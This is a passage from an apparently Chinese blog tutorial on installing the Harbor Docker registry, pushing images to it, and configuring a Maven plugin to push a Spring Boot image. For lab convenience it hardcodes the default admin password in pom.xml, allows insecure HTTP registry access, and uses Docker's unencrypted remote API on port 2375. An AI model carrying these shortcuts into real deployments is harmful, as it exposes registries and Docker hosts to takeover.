<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">[<span class="title class_">Step</span> <span class="number">0</span>]: checking <span class="keyword">if</span> docker is installed ...</span><br><span class="line"></span><br><span class="line"><span class="title class_">Note</span>: docker <span class="attr">version</span>: <span class="number">19.03</span><span class="number">.5</span></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Step</span> <span class="number">1</span>]: checking docker-compose is installed ...</span><br><span class="line"></span><br><span class="line"><span class="title class_">Note</span>: docker-compose <span class="attr">version</span>: <span class="number">1.24</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Step</span> <span class="number">2</span>]: loading <span class="title class_">Harbor</span> images ...</span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">migrator</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">core</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">db</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">registryctl</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/nginx-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/clair-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/clair-adapter-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">portal</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">log</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/registry-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/notary-signer-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/harbor-<span class="attr">jobservice</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/redis-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/<span class="attr">prepare</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/notary-server-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Loaded</span> <span class="attr">image</span>: goharbor/chartmuseum-<span class="attr">photon</span>:v1<span class="number">.10</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Step</span> <span class="number">3</span>]: preparing environment ...</span><br><span class="line"></span><br><span class="line">[<span class="title class_">Step</span> <span class="number">4</span>]: preparing harbor configs ...</span><br><span class="line">prepare base dir is set to /mydata/harbor/harbor</span><br><span class="line"><span class="attr">WARNING</span>:<span class="attr">root</span>:<span class="attr">WARNING</span>: <span class="variable constant_">HTTP</span> protocol is insecure. <span class="title class_">Harbor</span> will deprecate http protocol <span class="keyword">in</span> the future. <span class="title class_">Please</span> make sure to upgrade to https</span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>log/logrotate.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>log/rsyslog_docker.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>nginx/nginx.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>core/env</span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>core/app.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registry/config.<span class="property">yml</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registry/root.<span class="property">crt</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registryctl/env</span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registryctl/config.<span class="property">yml</span></span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>db/env</span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>jobservice/env</span><br><span class="line"><span class="title class_">Clearing</span> the configuration <span class="attr">file</span>: <span class="regexp">/config/</span>jobservice/config.<span class="property">yml</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>log/logrotate.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>log/rsyslog_docker.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>nginx/nginx.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>core/env</span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>core/app.<span class="property">conf</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registry/config.<span class="property">yml</span></span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>registryctl/env</span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>db/env</span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>jobservice/env</span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/config/</span>jobservice/config.<span class="property">yml</span></span><br><span class="line">loaded secret <span class="keyword">from</span> <span class="attr">file</span>: <span class="regexp">/secret/</span>keys/secretkey</span><br><span class="line"><span class="title class_">Generated</span> configuration <span class="attr">file</span>: <span class="regexp">/compose_location/</span>docker-compose.<span class="property">yml</span></span><br><span class="line"><span class="title class_">Clean</span> up the input dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Note</span>: stopping existing <span class="title class_">Harbor</span> instance ...</span><br><span class="line"><span class="title class_">Stopping</span> harbor-jobservice ... done</span><br><span class="line"><span class="title class_">Stopping</span> harbor-core       ... done</span><br><span class="line"><span class="title class_">Stopping</span> redis             ... done</span><br><span class="line"><span class="title class_">Stopping</span> registryctl       ... done</span><br><span class="line"><span class="title class_">Stopping</span> registry          ... done</span><br><span class="line"><span class="title class_">Stopping</span> harbor-db         ... done</span><br><span class="line"><span class="title class_">Stopping</span> harbor-portal     ... done</span><br><span class="line"><span class="title class_">Stopping</span> harbor-log        ... done</span><br><span class="line"><span class="title class_">Removing</span> harbor-jobservice ... done</span><br><span class="line"><span class="title class_">Removing</span> harbor-core       ... done</span><br><span class="line"><span class="title class_">Removing</span> redis             ... done</span><br><span class="line"><span class="title class_">Removing</span> registryctl       ... done</span><br><span class="line"><span class="title class_">Removing</span> registry          ... done</span><br><span class="line"><span class="title class_">Removing</span> harbor-db         ... done</span><br><span class="line"><span class="title class_">Removing</span> harbor-portal     ... done</span><br><span class="line"><span class="title class_">Removing</span> harbor-log        ... done</span><br><span class="line"><span class="title class_">Removing</span> network harbor_harbor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Step</span> <span class="number">5</span>]: starting <span class="title class_">Harbor</span> ...</span><br><span class="line"><span class="title class_">Creating</span> network <span class="string">&quot;harbor_harbor&quot;</span> <span class="keyword">with</span> the <span class="keyword">default</span> driver</span><br><span class="line"><span class="title class_">Creating</span> harbor-log ... done</span><br><span class="line"><span class="title class_">Creating</span> harbor-portal ... done</span><br><span class="line"><span class="title class_">Creating</span> registry      ... done</span><br><span class="line"><span class="title class_">Creating</span> harbor-db     ... done</span><br><span class="line"><span class="title class_">Creating</span> registryctl   ... done</span><br><span class="line"><span class="title class_">Creating</span> redis         ... done</span><br><span class="line"><span class="title class_">Creating</span> harbor-core   ... done</span><br><span class="line"><span class="title class_">Creating</span> harbor-jobservice ... done</span><br><span class="line"><span class="title class_">Creating</span> nginx             ... done</span><br><span class="line">✔ ----<span class="title class_">Harbor</span> has been installed and started successfully.----</span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以使用命令查看下安装Harbor安装的Docker镜像，还挺多的;<code>docker images</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">REPOSITORY</span>                           <span class="variable constant_">TAG</span>                 <span class="variable constant_">IMAGE</span> <span class="variable constant_">ID</span>            <span class="variable constant_">CREATED</span>             <span class="variable constant_">SIZE</span>                              latest              dc3bacd8b5ea        <span class="number">8</span> days ago          <span class="number">1.</span>23MB</span><br><span class="line">goharbor/chartmuseum-photon          v1<span class="number">.10</span><span class="number">.6</span>             01b70eccaf71        <span class="number">2</span> weeks ago         178MB</span><br><span class="line">goharbor/harbor-migrator             v1<span class="number">.10</span><span class="number">.6</span>             a5d4a4ee44e4        <span class="number">2</span> weeks ago         356MB</span><br><span class="line">goharbor/redis-photon                v1<span class="number">.10</span><span class="number">.6</span>             99e25b65195c        <span class="number">2</span> weeks ago         132MB</span><br><span class="line">goharbor/clair-adapter-photon        v1<span class="number">.10</span><span class="number">.6</span>             aa72598ecc12        <span class="number">2</span> weeks ago         <span class="number">61.</span>3MB</span><br><span class="line">goharbor/clair-photon                v1<span class="number">.10</span><span class="number">.6</span>             da1b03030e34        <span class="number">2</span> weeks ago         171MB</span><br><span class="line">goharbor/notary-server-photon        v1<span class="number">.10</span><span class="number">.6</span>             37c8bed3e255        <span class="number">2</span> weeks ago         142MB</span><br><span class="line">goharbor/notary-signer-photon        v1<span class="number">.10</span><span class="number">.6</span>             c56d82220929        <span class="number">2</span> weeks ago         139MB</span><br><span class="line">goharbor/harbor-registryctl          v1<span class="number">.10</span><span class="number">.6</span>             1d3986d90c65        <span class="number">2</span> weeks ago         101MB</span><br><span class="line">goharbor/registry-photon             v1<span class="number">.10</span><span class="number">.6</span>             3e669c8204ed        <span class="number">2</span> weeks ago         <span class="number">83.</span>7MB</span><br><span class="line">goharbor/nginx-photon                v1<span class="number">.10</span><span class="number">.6</span>             a39d8dd46060        <span class="number">2</span> weeks ago         <span class="number">43.</span>7MB</span><br><span class="line">goharbor/harbor-log                  v1<span class="number">.10</span><span class="number">.6</span>             1085d3865a57        <span class="number">2</span> weeks ago         106MB</span><br><span class="line">goharbor/harbor-jobservice           v1<span class="number">.10</span><span class="number">.6</span>             aa05538acecf        <span class="number">2</span> weeks ago         143MB</span><br><span class="line">goharbor/harbor-core                 v1<span class="number">.10</span><span class="number">.6</span>             193e76e6be5d        <span class="number">2</span> weeks ago         129MB</span><br><span class="line">goharbor/harbor-portal               v1<span class="number">.10</span><span class="number">.6</span>             942a9c448850        <span class="number">2</span> weeks ago         <span class="number">51.</span>8MB</span><br><span class="line">goharbor/harbor-db                   v1<span class="number">.10</span><span class="number">.6</span>             37da2e5414ae        <span class="number">2</span> weeks ago         170MB</span><br><span class="line">goharbor/prepare                     v1<span class="number">.10</span><span class="number">.6</span>             35f073e33ec5        <span class="number">2</span> weeks ago         177MB</span><br></pre></td></tr></table></figure>

<ul>
<li>访问Harbor的管理界面，输入账号密码登录即可，访问地址：<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMy4xMDEvJTYwYWRtaW46SGFyYm9yMTIzNDUlNjA=">http://192.168.3.101/`admin:Harbor12345`</span></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/rngibjvpq3.png?imageView2/2/w/1620" alt="img"></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a><strong>使用</strong></h4><blockquote>
<p>接下来我们就可以使用Harbor来管理我们的镜像了。</p>
</blockquote>
<ul>
<li>首先点击按钮，新建一个项目：<code>新建项目</code></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/zkcftwgree.png?imageView2/2/w/1620" alt="img"></p>
<ul>
<li>这里新建一个叫做的私有项目；<code>test</code></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/sppv6e1v0a.png?imageView2/2/w/1620" alt="img"></p>
<ul>
<li>由于命令默认不支持http访问，所以我们需要手动开启，使用Vim编辑器修改docker的配置文件;<code>docker login``daemon.json</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/docker/daemon.<span class="property">json</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>添加一行配置即可，允许使用非安全方式访问Harbor镜像仓库，注意不要少了端口号;<code>insecure-registries``80</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;registry-mirrors&quot;</span>:[<span class="string">&quot;https://xxx.aliyuncs.com&quot;</span>],</span><br><span class="line"> <span class="string">&quot;insecure-registries&quot;</span>:[<span class="string">&quot;192.168.3.101:80&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>再次重新启动docker服务;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>再次使用启动Harbor服务;<code>install.sh</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./install.<span class="property">sh</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>使用命令访问Harbor镜像仓库，注意加上端口号为;<code>docker login``80</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-local harbor]# docker login <span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span>:<span class="number">80</span></span><br><span class="line"><span class="title class_">Username</span>: admin</span><br><span class="line"><span class="title class_">Password</span>: </span><br><span class="line"><span class="variable constant_">WARNING</span>! <span class="title class_">Your</span> password will be stored unencrypted <span class="keyword">in</span> /root/.<span class="property">docker</span>/config.<span class="property">json</span>.</span><br><span class="line"><span class="title class_">Configure</span> a credential helper to remove <span class="variable language_">this</span> warning. <span class="title class_">See</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//docs.docker.com/engine/reference/commandline/login/#credentials-store</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Login</span> <span class="title class_">Succeeded</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>编写Dockerfile脚本，用于构建Docker镜像，一个最简单的busybox脚本如下;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">FROM</span> <span class="attr">busybox</span>:latest</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>使用如下命令构建一个自己的busybox镜像;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span>:<span class="number">80</span>/test/busybox .</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>将自己构建的busybox镜像推送到Harbor镜像仓库;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push <span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span>:<span class="number">80</span>/test/busybox</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>推送成功后在Harbor的管理界面中就可以查看到busybox镜像了;</li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/q2xx5cx33m.png?imageView2/2/w/1620" alt="img"></p>
<ul>
<li>由于Harbor是用Docker Compose部署的，可以直接使用Docker Compose的命令来停止和启动。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 停止<span class="title class_">Harbor</span></span><br><span class="line">docker-compose stop</span><br><span class="line"># 启动<span class="title class_">Harbor</span></span><br><span class="line">docker-compose start</span><br></pre></td></tr></table></figure>

<p>复制</p>
<h4 id="结合SpringBoot使用"><a href="#结合SpringBoot使用" class="headerlink" title="结合SpringBoot使用"></a>结合SpringBoot使用</h4><blockquote>
<p>这里使用之前的项目来演示下，如何使用Maven插件一键打包并推送到Harbor镜像仓库。<code>mall-tiny-fabric</code></p>
</blockquote>
<ul>
<li>首先修改项目的文件，修改推送的，并添加即可；<code>pom.xml``镜像仓库地址``认证信息</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.fabric8<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span></span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>docker-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span></span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.33.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span></span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!--如果想在项目打包时构建镜像添加--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">id</span>&gt;</span>build-image<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">goal</span>&gt;</span>build<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span></span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!-- Docker 远程管理地址--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">dockerHost</span>&gt;</span>http://192.168.3.101:2375<span class="tag">&lt;/<span class="name">dockerHost</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!-- Docker 推送镜像仓库地址--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">pushRegistry</span>&gt;</span>http://192.168.3.101:80<span class="tag">&lt;/<span class="name">pushRegistry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="comment">&lt;!-- 认证信息--&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">authConfig</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">push</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">password</span>&gt;</span>Harbor12345<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;/<span class="name">push</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;/<span class="name">authConfig</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">images</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">image</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="comment">&lt;!--由于推送到私有镜像仓库，镜像名需要添加仓库地址--&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">name</span>&gt;</span>192.168.3.101:80/mall-tiny/$&#123;project.name&#125;:$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="comment">&lt;!--定义镜像构建行为--&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">build</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--定义基础镜像--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">from</span>&gt;</span>java:8<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">args</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;<span class="name">JAR_FILE</span>&gt;</span>$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">JAR_FILE</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--定义哪些文件拷贝到容器中--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">assembly</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="comment">&lt;!--定义拷贝到容器的目录--&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;<span class="name">targetDir</span>&gt;</span>/<span class="tag">&lt;/<span class="name">targetDir</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="comment">&lt;!--只拷贝生成的jar包--&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>artifact<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--定义容器启动命令--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">entryPoint</span>&gt;</span>[&quot;java&quot;, &quot;-jar&quot;,&quot;/$&#123;project.build.finalName&#125;.jar&quot;]<span class="tag">&lt;/<span class="name">entryPoint</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--定义维护者--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">maintainer</span>&gt;</span>macrozheng<span class="tag">&lt;/<span class="name">maintainer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--使用Dockerfile构建时打开--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--&lt;dockerFileDir&gt;$&#123;project.basedir&#125;&lt;/dockerFileDir&gt;--&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="comment">&lt;!--定义容器启动行为--&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;<span class="name">run</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--设置容器名，可采用通配符--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">containerNamePattern</span>&gt;</span>$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">containerNamePattern</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--设置端口映射--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">ports</span>&gt;</span></span></span><br><span class="line"><span 